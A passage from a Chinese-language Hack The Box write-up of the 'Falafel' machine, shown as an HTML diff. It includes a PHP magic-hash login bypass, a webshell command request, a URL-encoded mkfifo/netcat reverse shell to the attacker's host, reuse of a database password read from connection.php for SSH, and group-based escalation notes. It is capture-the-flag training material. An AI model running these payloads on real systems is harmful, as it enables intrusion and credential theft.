0</span><br>equal<br><br>您可以使用===php 中的运算符来解决此问题：<br><br><br>php &gt; <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;aafa2c1fb515c53a3349c7f8d619abc8&quot;</span> === <span class="hljs-number">0</span>) &#123; echo <span class="hljs-string">&quot;equal&quot;</span>; &#125; <span class="hljs-keyword">else</span> &#123; echo <span class="hljs-string">&quot;not equal&quot;</span>; &#125;<br>not equal<br><br><br>玩弄管理员的密码<br>在思考类型杂耍的提示下，我尝试了一些方法来进入该网站。<br><br>这将起作用，因为我们已经获得了管理员密码的哈希值，并且它以,sqlmap开头。<span class="hljs-number">0e0</span>e462096931906507119562988736854<br><br>上面的 Magic Hashes 参考资料为许多不同的哈希类型提供了一个字符串，这些字符串以 开头<span class="hljs-number">0</span>e。尝试这些，其中md5一个，<span class="hljs-number">240610708</span>登录：<br><br><br>重现攻击的步骤：Behind Security 搜索了一个特制的字符串，其 md5 版本以“<span class="hljs-number">0</span>e”开头，并作为用户“admin”的密码提交。提交的密码是：<span class="hljs-number">240610708</span>。其 md5 哈希等于：“<span class="hljs-number">0e462097431906509019562988736854</span>”，PHP 将其解释为 <span class="hljs-number">0</span>。它与存储的哈希“<span class="hljs-number">0e462096931906507119562988736854</span>”匹配，因此身份验证成功。<br></code></pre></td></tr></table></figure>
+
+<p>12、尝试攻击利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ls -la          <br>总计 <span class="hljs-number">36</span><br>drwxr-xr-x  <span class="hljs-number">6</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">5</span>月<span class="hljs-number">29</span>日 <span class="hljs-number">00</span>:<span class="hljs-number">24</span> .<br>drwx------ <span class="hljs-number">28</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">5</span>月<span class="hljs-number">29</span>日 <span class="hljs-number">00</span>:<span class="hljs-number">24</span> ..<br>-rw-r--r--  <span class="hljs-number">1</span> kali kali  <span class="hljs-number">602</span>  <span class="hljs-number">5</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">10</span>:<span class="hljs-number">47</span> <span class="hljs-number">1.</span>txt<br>-rw-r--r--  <span class="hljs-number">1</span> kali kali   <span class="hljs-number">33</span>  <span class="hljs-number">5</span>月<span class="hljs-number">29</span>日 <span class="hljs-number">00</span>:<span class="hljs-number">19</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png<br>-rw-r--r--  <span class="hljs-number">1</span> root root  <span class="hljs-number">334</span>  <span class="hljs-number">5</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">10</span>:<span class="hljs-number">25</span> allports<br>drwxr-xr-x  <span class="hljs-number">2</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">5</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">00</span>:<span class="hljs-number">43</span> htb-vpn<br>drwxr-xr-x  <span class="hljs-number">3</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">5</span>月<span class="hljs-number">28</span>日 <span class="hljs-number">10</span>:<span class="hljs-number">36</span> reports<br>drwxr-xr-x  <span class="hljs-number">4</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">3</span>月<span class="hljs-number">29</span>日 <span class="hljs-number">16</span>:<span class="hljs-number">50</span> .svn<br>drwxr-xr-x <span class="hljs-number">17</span> kali kali <span class="hljs-number">4096</span>  <span class="hljs-number">5</span>月<span class="hljs-number">27</span>日 <span class="hljs-number">06</span>:<span class="hljs-number">51</span> tools<br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 -m http.server <span class="hljs-number">80</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span> - - [<span class="hljs-number">29</span>/May/<span class="hljs-number">2024</span> <span class="hljs-number">00</span>:<span class="hljs-number">25</span>:<span class="hljs-number">01</span>] <span class="hljs-string">&quot;GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -vv http:<span class="hljs-comment">//10.10.10.73/uploads/0528-1121_d5f4d5f823b0c53b/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=id</span><br>*   Trying <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>:<span class="hljs-number">80.</span>..<br>* Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span> (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>) port <span class="hljs-number">80</span><br>&gt; GET /uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=id HTTP/<span class="hljs-number">1.1</span><br>&gt; Host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span><br>&gt; User-Agent: curl/<span class="hljs-number">8.5</span><span class="hljs-number">.0</span><br>&gt; Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">&gt; </span><br><span class="hljs-comment">&lt; HTTP/1.1 200 OK</span><br><span class="hljs-comment">&lt; Date: Tue, 28 May 2024 08:24:48 GMT</span><br><span class="hljs-comment">&lt; Server: Apache/2.4.18 (Ubuntu)</span><br><span class="hljs-comment">&lt; Content-Length: 54</span><br><span class="hljs-comment">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="hljs-comment">&lt; </span><br><span class="hljs-comment">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-comment">* Connection #0 to host 10.10.10.73 left intact</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>13、开始构造反弹shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -vv http:<span class="hljs-comment">//10.10.10.73/uploads/0528-1121_d5f4d5f823b0c53b/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.45%20443%20%3E%2Ftmp%2Ff</span><br>*   Trying <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>:<span class="hljs-number">80.</span>..<br>* Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span> (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>) port <span class="hljs-number">80</span><br>&gt; GET /uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=rm%<span class="hljs-number">20</span>%<span class="hljs-number">2F</span>tmp%<span class="hljs-number">2F</span>f%<span class="hljs-number">3B</span>mkfifo%<span class="hljs-number">20</span>%<span class="hljs-number">2F</span>tmp%<span class="hljs-number">2F</span>f%<span class="hljs-number">3B</span>cat%<span class="hljs-number">20</span>%<span class="hljs-number">2F</span>tmp%<span class="hljs-number">2F</span>f%<span class="hljs-number">7</span>C%<span class="hljs-number">2F</span>bin%<span class="hljs-number">2F</span>sh%<span class="hljs-number">20</span>-i%<span class="hljs-number">202</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">7</span>Cnc%<span class="hljs-number">2010.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>%<span class="hljs-number">20443</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">2F</span>tmp%<span class="hljs-number">2F</span>f HTTP/<span class="hljs-number">1.1</span><br>&gt; Host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span><br>&gt; User-Agent: curl/<span class="hljs-number">8.5</span><span class="hljs-number">.0</span><br>&gt; Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">&gt; </span><br></code></pre></td></tr></table></figure>
+
+<p>14、成功获取到初始的shell环境</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">443</span>       <br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>] <span class="hljs-number">49606</span><br>/bin/sh: <span class="hljs-number">0</span>: can<span class="hljs-number">&#x27;</span>t access tty; job control turned off<br>$ id<br>uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>$ <br></code></pre></td></tr></table></figure>
+
+<p>15、升级一下完整的shell环境</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">$ python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@falafel:/var/www/html/uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b$ script /dev/null -c bash<br>&lt;<span class="hljs-number">528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b$ script /dev/null -c bash               <br>Script started, file is /dev/null<br>www-data@falafel:/var/www/html/uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b$ ^Z<br>zsh: suspended  nc -lvnp <span class="hljs-number">443</span><br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ stty raw -echo; fg<br>[<span class="hljs-number">1</span>]  + continued  nc -lvnp <span class="hljs-number">443</span><br>                              reset<br>reset: unknown terminal type unknown<br>Terminal type? screen<br><br>www-data@falafel:/var/www/html/uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b$ <br><br><br>www-data@falafel:/var/www/html/uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b$ ls -la /home<br>total <span class="hljs-number">16</span><br>drwxr-xr-x  <span class="hljs-number">4</span> root  root  <span class="hljs-number">4096</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> .<br>drwxr-xr-x <span class="hljs-number">23</span> root  root  <span class="hljs-number">4096</span> Nov <span class="hljs-number">24</span>  <span class="hljs-number">2023</span> ..<br>drwx------  <span class="hljs-number">4</span> moshe moshe <span class="hljs-number">4096</span> Nov <span class="hljs-number">24</span>  <span class="hljs-number">2023</span> moshe<br>drwx------  <span class="hljs-number">4</span> yossi yossi <span class="hljs-number">4096</span> Nov <span class="hljs-number">24</span>  <span class="hljs-number">2023</span> yossi<br>www-data@falafel:/var/www/html/uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b$ <br></code></pre></td></tr></table></figure>
+
+<p>16、经过枚举，发现了数据库的连接信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">www-data@falafel:/var/www/html/uploads/<span class="hljs-number">0528</span><span class="hljs-number">-1121</span>_d5f4d5f823b0c53b$ cd ../../<br>www-data@falafel:/var/www/html$ ls -la<br>total <span class="hljs-number">92</span><br>drwxr-x--- <span class="hljs-number">7</span> root www-data <span class="hljs-number">4096</span> Sep <span class="hljs-number">13</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">3</span> root root     <span class="hljs-number">4096</span> Sep <span class="hljs-number">13</span>  <span class="hljs-number">2022</span> ..<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data   <span class="hljs-number">41</span> Oct <span class="hljs-number">29</span>  <span class="hljs-number">2017</span> .htaccess<br>drwxr-xr-- <span class="hljs-number">2</span> root www-data <span class="hljs-number">4096</span> Oct <span class="hljs-number">29</span>  <span class="hljs-number">2017</span> assets<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data  <span class="hljs-number">423</span> Oct <span class="hljs-number">29</span>  <span class="hljs-number">2017</span> authorized.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data  <span class="hljs-number">377</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> connection.php<br>drwxr-xr-- <span class="hljs-number">2</span> root www-data <span class="hljs-number">4096</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> css<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data  <span class="hljs-number">804</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> cyberlaw.txt<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data    <span class="hljs-number">0</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> footer.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data <span class="hljs-number">1140</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> header.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data <span class="hljs-number">7335</span> Aug <span class="hljs-number">13</span>  <span class="hljs-number">2015</span> icon.png<br>drwxr-xr-- <span class="hljs-number">2</span> root www-data <span class="hljs-number">4096</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> images<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data  <span class="hljs-number">818</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> index.php<br>drwxr-xr-- <span class="hljs-number">2</span> root www-data <span class="hljs-number">4096</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> js<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data  <span class="hljs-number">752</span> Oct <span class="hljs-number">29</span>  <span class="hljs-number">2017</span> login.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data <span class="hljs-number">1800</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> login_logic.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data  <span class="hljs-number">107</span> Oct <span class="hljs-number">29</span>  <span class="hljs-number">2017</span> logout.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data <span class="hljs-number">1913</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> profile.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data   <span class="hljs-number">30</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> robots.txt<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data <span class="hljs-number">6174</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> style.php<br>-rwxr-xr-- <span class="hljs-number">1</span> root www-data <span class="hljs-number">3647</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2017</span> upload.php<br>drwxrwxr-- <span class="hljs-number">3</span> root www-data <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">21</span> uploads<br>www-data@falafel:/var/www/html$ cat connection.php<br>&lt;?php<br>   <span class="hljs-title function_">define</span><span class="hljs-params">(<span class="hljs-string">&#x27;DB_SERVER&#x27;</span>, <span class="hljs-string">&#x27;localhost:3306&#x27;</span>)</span>;<br>   define(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;moshe&#x27;</span>);<br>   define(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;falafelIsReallyTasty&#x27;</span>);<br>   define(<span class="hljs-string">&#x27;DB_DATABASE&#x27;</span>, <span class="hljs-string">&#x27;falafel&#x27;</span>);<br>   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);<br>   <span class="hljs-comment">// Check connection</span><br>   <span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>   &#123;<br>      echo <span class="hljs-string">&quot;Failed to connect to MySQL: &quot;</span> . mysqli_connect_error();<br>   &#125;<br>?&gt;<br>www-data@falafel:/var/www/html$ <br></code></pre></td></tr></table></figure>
+
+<p>17、该密码正好存在复用情况，使用该密码，成功SSH登录到服务器</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh moshe@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span><br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.73 (10.10.10.73)&#x27;</span> can<span class="hljs-number">&#x27;</span>t be established.<br>ED25519 key fingerprint is SHA256:HkqcmyRF5DsZuFTcQxQ4QcKq7eG+mQMn8MX9G5RkN5s.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-keyword">continue</span> <span class="hljs-title function_">connecting</span> <span class="hljs-params">(yes/no/[fingerprint])</span>? yes<br>Warning: Permanently added &#x27;10.10.10.73&#x27; <span class="hljs-params">(ED25519)</span> to the <span class="hljs-built_in">list</span> of known hosts.<br>moshe@10.10.10.73&#x27;s password: <br>Welcome to Ubuntu 18.04.6 <span class="hljs-title function_">LTS</span> <span class="hljs-params">(GNU/Linux <span class="hljs-number">4.15</span><span class="hljs-number">.0</span><span class="hljs-number">-213</span>-generic x86_64)</span><br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br>Expanded Security Maintenance <span class="hljs-keyword">for</span> Infrastructure is not enabled.<br><br>159 updates can be applied immediately.<br>51 of these updates are standard security updates.<br>To see these additional updates run: apt <span class="hljs-built_in">list</span> --upgradable<br><br>Enable ESM Infra to receive additional <span class="hljs-built_in">future</span> security updates.<br>See https:<span class="hljs-comment">//ubuntu.com/esm or run: sudo pro status</span><br><br>Failed to connect to https:<span class="hljs-comment">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><br><br>Last login: Fri Nov 24 10:02:35 2023 from 10.10.14.19<br>$ id<br>uid=<span class="hljs-number">1001</span>(moshe) gid=<span class="hljs-number">1001</span>(moshe) groups=<span class="hljs-number">1001</span>(moshe),<span class="hljs-number">4</span>(adm),<span class="hljs-number">8</span>(mail),<span class="hljs-number">9</span>(news),<span class="hljs-number">22</span>(voice),<span class="hljs-number">25</span>(floppy),<span class="hljs-number">29</span>(audio),<span class="hljs-number">44</span>(video),<span class="hljs-number">60</span>(games)<br>$<br></code></pre></td></tr></table></figure>
+
+<p>18、至此获取到第一个flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">$ pwd<br>/home/moshe<br>$ ls -la<br>total <span class="hljs-number">32</span><br>drwx------ <span class="hljs-number">4</span> moshe moshe <span class="hljs-number">4096</span> Nov <span class="hljs-number">24</span>  <span class="hljs-number">2023</span> .<br>drwxr-xr-x <span class="hljs-number">4</span> root  root  <span class="hljs-number">4096</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root  root     <span class="hljs-number">9</span> Sep <span class="hljs-number">13</span>  <span class="hljs-number">2022</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> moshe moshe  <span class="hljs-number">220</span> Sep  <span class="hljs-number">1</span>  <span class="hljs-number">2015</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> moshe moshe <span class="hljs-number">3803</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> moshe moshe <span class="hljs-number">4096</span> Nov <span class="hljs-number">27</span>  <span class="hljs-number">2017</span> .cache<br>drwx------ <span class="hljs-number">3</span> moshe moshe <span class="hljs-number">4096</span> Nov <span class="hljs-number">24</span>  <span class="hljs-number">2023</span> .gnupg<br>-rw-r--r-- <span class="hljs-number">1</span> moshe moshe  <span class="hljs-number">655</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> .profile<br>-r-------- <span class="hljs-number">1</span> moshe moshe   <span class="hljs-number">33</span> May <span class="hljs-number">28</span> <span class="hljs-number">05</span>:<span class="hljs-number">17</span> user.txt<br>$ cat user.txt<br><span class="hljs-number">9</span>ee4e09cde5fa96b789f422415095c77<br>$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>19、在枚举时，发现了用户所在一个特殊的权限组里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">$ id<br>uid=<span class="hljs-number">1001</span>(moshe) gid=<span class="hljs-number">1001</span>(moshe) groups=<span class="hljs-number">1001</span>(moshe),<span class="hljs-number">4</span>(adm),<span class="hljs-number">8</span>(mail),<span class="hljs-number">9</span>(news),<span class="hljs-number">22</span>(voice),<span class="hljs-number">25</span>(floppy),<span class="hljs-number">29</span>(audio),<span class="hljs-number">44</span>(video),<span class="hljs-number">60</span>(games)<br>$ find / -type f -group video <span class="hljs-number">2</span>&gt;/dev/null | grep -v /sys | grep -v /proc                                                                        <br>$ find / -type d -group video <span class="hljs-number">2</span>&gt;/dev/null | grep -v /sys | grep -v /proc<br>$ find / -type f \( -name <span class="hljs-string">&quot;*.sh&quot;</span> -o -name <span class="hljs-string">&quot;*.py&quot;</span> -o -name <span class="hljs-string">&quot;*.pl&quot;</span> -o -name <span class="hljs-string">&quot;*.rb&quot;</span> -o -name <span class="hljs-string">&quot;*.php&quot;</span> \) -group video <span class="hljs-number">2</span>&gt;/dev/null | grep -v /sys | grep -v /proc<br>$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">水平权限提升 – yossi<br>漏洞说明： 用户“moshe”被发现是“video”组的成员，该组授予了监控已登录用户信息的权限。进一步调查证实，用户“yossi”已登录系统并拥有有效的 tty shell。这种情况造成了潜在的安全漏洞，因为“yossi”可以滥用与“video”组相关的权限来获取对敏感数据的未经授权的访问权限并执行未经授权的操作。<br><br>漏洞修复：为了缓解此水平特权升级漏洞，系统管理员应仔细检查并限制用户的组成员身份。仅授予必要的特权，避免向用户提供过多的权限，尤其是当涉及到可以访问敏感信息的“视频”等组时。此外，定期检查和审核组成员身份以确保用户拥有执行其预期任务所需的最低权限也至关重要。<br><br>运行id验证用户“moshe”确实是“video”组的成员。<br>检查目标系统是否有用户“yossi”使用有效的 tty shell 登录。运行该命令ps aux应显示活动用户会话，如果“yossi”使用 tty shell，则表示存在活动登录会话。<br>由于“moshe”有权监控已登录用户的信息，因此攻击者可以利用此权限升级来访问 yossi 的会话。请参阅此资源以成功利用此漏洞。<br></code></pre></td></tr></table></figure>
+
